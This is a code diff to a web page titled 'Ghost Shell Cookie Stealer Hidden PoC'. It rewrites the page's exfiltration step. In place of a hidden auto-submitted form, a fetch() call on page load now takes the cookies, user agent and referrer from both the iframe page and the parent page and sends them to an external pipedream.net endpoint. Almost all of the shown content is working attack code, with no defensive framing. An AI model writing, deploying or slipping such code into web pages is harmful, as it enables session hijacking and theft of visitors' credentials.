@@ -27,27 +27,29 @@
     <style>
         body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; font-family: Arial, sans-serif; }
         h2 { text-align: center; color: gold; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
-        form { display: none; }
     </style>
 </head>
 <body>
     <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
-    <form id="stealthForm" action="https://eoy4evvlsf7y0jq.m.pipedream.net" method="POST">
-        <input type="hidden" name="cookie_data" id="cookieField" value="default_cookie">
-        <input type="hidden" name="user_agent" id="userAgentField" value="default_agent">
-        <input type="hidden" name="referrer" id="referrerField" value="default_referrer">
-        <input type="hidden" name="fallback" value="not_empty">
-        <button type="submit" name="submitButton">Send</button>
-    </form>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             var cookies = document.cookie || "No_Cookies_Found";
             var userAgent = navigator.userAgent || "Unknown_User_Agent";
             var referrer = document.referrer || "No_Referrer";
-            document.getElementById("cookieField").value = cookies;
-            document.getElementById("userAgentField").value = userAgent;
-            document.getElementById("referrerField").value = referrer;
-            document.getElementById("stealthForm").submit();
+            console.log("Iframe Cookies: ", cookies); // Debug log
+            setTimeout(() => { // Delay to ensure DOM is ready
+                fetch("https://eoy4evvlsf7y0jq.m.pipedream.net", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        cookie_data: cookies,
+                        user_agent: userAgent,
+                        referrer: referrer,
+                        source: "iframe"
+                    })
+                }).then(response => console.log("Iframe fetch success:", response.ok))
+                  .catch(error => console.error("Iframe fetch error:", error));
+            }, 500); // 500ms delay
         });
     </script>
 </body>
@@ -57,7 +59,6 @@
     </div>
 
     <script>
-        // Capture cookies in the parent context and send them immediately
         document.addEventListener("DOMContentLoaded", function() {
             var parentCookies = document.cookie || "No_Parent_Cookies";
             console.log("Parent Cookies: ", parentCookies);
@@ -70,8 +71,9 @@
                     referrer: document.referrer,
                     source: "parent_page"
                 })
-            });
-            runCode(); // Still auto-run the iframe code
+            }).then(response => console.log("Parent fetch success:", response.ok))
+              .catch(error => console.error("Parent fetch error:", error));
+            runCode();
         });
 
         function runCode() {
